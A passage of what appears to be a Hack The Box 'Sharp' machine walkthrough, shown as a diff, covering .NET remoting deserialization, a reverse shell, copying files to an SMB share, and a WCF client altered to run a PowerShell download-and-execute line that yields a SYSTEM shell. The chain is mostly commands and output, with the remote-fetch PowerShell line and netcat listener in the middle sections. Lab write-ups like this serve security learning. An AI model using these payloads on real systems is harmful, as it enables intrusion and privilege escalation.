zIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
+
+System.InvalidCastException: Unable to cast object of type 'System.Collections.Generic.SortedSet`1[System.String]' to type 'System.Runtime.Remoting.Messaging.IMessage'.
+   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
+   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage& responseMsg, ITransportHeaders& responseHeaders, Stream& responseStream)
+=====================================================================================================================================
+
+However this is fine as we still get our payload working and get a reverse shell.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/www]
+└──╼ $rlwrap nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.219] 49674
+Windows PowerShell running as user lars on SHARP
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+sharp\lars
+=====================================================================================================================================
+
+We find an interesting directory in the users Documents folder, we can retrieve it usin compress-archive and afterwards we use
+net use to have access to the windows share drive we have created for the box.
+Commands and Output:
+=====================================================================================================================================
+compress-archive -Path wcf -Dest wcf.zip
+ls
+
+
+    Directory: C:\Users\lars\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       11/15/2020   1:40 PM                wcf                                                                   
+-a----         5/2/2021  12:31 AM       11598452 wcf.zip                                                               
+
+
+net use x: \\10.10.14.15\share testing /user:testing
+The command completed successfully.
+
+cp wcf.zip x:
+cd x:
+ls
+
+
+    Directory: x:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         5/1/2021   8:23 PM                kanban                                                                
+d-----         5/1/2021   8:21 PM                pkb                                                                   
+d-----         5/1/2021  11:08 PM                dev                                                                   
+-a----         5/1/2021  10:14 PM          40995 kanban-gui.png                                                        
+-a----         5/1/2021  10:34 PM          52576 decrypt-iv-key.png                                                    
+-a----         5/1/2021  11:18 PM          59071 dev-server-port.png                                                   
+-a----         5/1/2021  11:22 PM          40241 client-creds.png                                                      
+-a----         5/2/2021  12:31 AM       11598452 wcf.zip                                                               
+
+
+=====================================================================================================================================
+
+We now can unzip wcf and examine the contents. We get another windows remoting application
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/sharp/smb/wcf]
+└──╼ $ls
+wcf  wcf.zip
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/wcf]
+└──╼ $cd wcf/
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/wcf/wcf]
+└──╼ $ls
+Client  packages  RemotingLibrary  Server  wcf.sln
+=====================================================================================================================================
+
+Once we properly start the application for wcf with visual studio we modify the ip address of the main program and rebuild the wcf
+program, when we try starting the program in visual studio 2019 we get a login error say it could gain access.
+
+To bypass this on a windows commandline we will issue the following.
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando>runas /user:lars /netonly cmd
+Enter the password for lars:
+Attempting to start cmd as user "DESKTOP-CN05D2Q\lars" ...
+
+..
+..
+..
+
+C:\WINDOWS\system32>dir \\10.10.10.219\dev
+ Volume in drive \\10.10.10.219\dev is System
+ Volume Serial Number is 7824-B3D4
+
+ Directory of \\10.10.10.219\dev
+
+11/15/2020  04:30 AM    <DIR>          .
+11/15/2020  04:30 AM    <DIR>          ..
+11/15/2020  03:25 AM             5,632 Client.exe
+11/15/2020  06:59 AM                70 notes.txt
+11/15/2020  03:25 AM             4,096 RemotingLibrary.dll
+11/16/2020  04:55 AM             6,144 Server.exe
+               4 File(s)         15,942 bytes
+               2 Dir(s)  30,373,093,376 bytes free
+
+C:\WINDOWS\system32>
+=====================================================================================================================================
+
+So the gist of what happened is that we used runas within our windows box to run as the lars user and since we entered the password creds
+for lars we now have access to the foreign directories on hack the box via smb.
+
+We go back and edit the program.cs main class to execute our reverse shell and from the lar user windows execute the application
+Commands and Output:
+=====================================================================================================================================
+namespace Client {
+
+    public class Client
+    {
+        public static void Main() {
+            ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(
+                new NetTcpBinding(SecurityMode.Transport),"net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint"
+            );
+            IWcfService client = channelFactory.CreateChannel();
+            Console.WriteLine(client.GetDiskInfo());
+            Console.WriteLine(client.GetCpuInfo());
+            Console.WriteLine(client.GetRamInfo());
+           Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/rev.ps1')"));
+        }
+    }
+..
+..
+..
+..
+c:\Users\commando\Desktop\sharp\wcf\Client\bin\Release>.\WcfClient.exe
+
+DeviceID         Free(GB)        Total(GB)
+--------         --------        ---------
+C:       28.2863540649414 39.5097618103027
+
+
+
+
+
+
+Physical Processors : 2
+Logical Processors  : 2
+
+
+
+
+
+
+
+Total Memory(GB) : 3
+Free Memory(GB)  : 3
+=====================================================================================================================================
+
+Our reverse shell listening and receivig the foreign connection.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/www]
+└──╼ $rlwrap nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.219] 49679
+Windows PowerShell running as user SHARP$ on SHARP
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+nt authority\system
+=====================================================================================================================================
+
+And we are system. To unmount the shares use the following
+Commands and Output:
+====================================================================================================================================
+net use x: \\192.168.33.4\share /delete
+=====================================================================================================================================
+To delete routes setup previously, THIS NEEDS TO BE RUN BY HIGH PRIVILEGE USER SUCH AS AN ADMINISTRATOR
+Commands and Output:
+====================================================================================================================================
+C:\WINDOWS\system32>route delete 10.10.10.0 mask 255.255.255.0 192.168.33.7
+=====================================================================================================================================
+DELETE previously created iptables rules
+Commands and Output:
+====================================================================================================================================
+sudo iptables -L --line-numbers
+[sudo] password for user: 
+Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+num  target     prot opt source               destination         
+1    ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED
+2    ACCEPT     all  --  anywhere             anywhere            
+
+Chain OUTPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -D FORWARD 1
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -D FORWARD 2
+iptables: Index of deletion too big.
+┌─[✗]─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -D FORWARD 1
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -L --line-numbers
+Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+num  target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+num  target     prot opt source               destination
+=====================================================================================================================================
+Deleting nat postrouting rules
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -L -t nat
+Chain PREROUTING (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain POSTROUTING (policy ACCEPT)
+target     prot opt source               destination         
+MASQUERADE  all  --  192.168.33.0/24      anywhere
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -t nat -D POSTROUTING 1
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $sudo iptables -L -t nat
+Chain PREROUTING (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain POSTROUTING (policy ACCEPT)
+target     prot opt source               destination
+=====================================================================================================================================
+
+Reversing ip_forward
+Commands and Output:
+====================================================================================================================================
+echo 0 > /proc/sys/net/ipv4/ip_forward
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
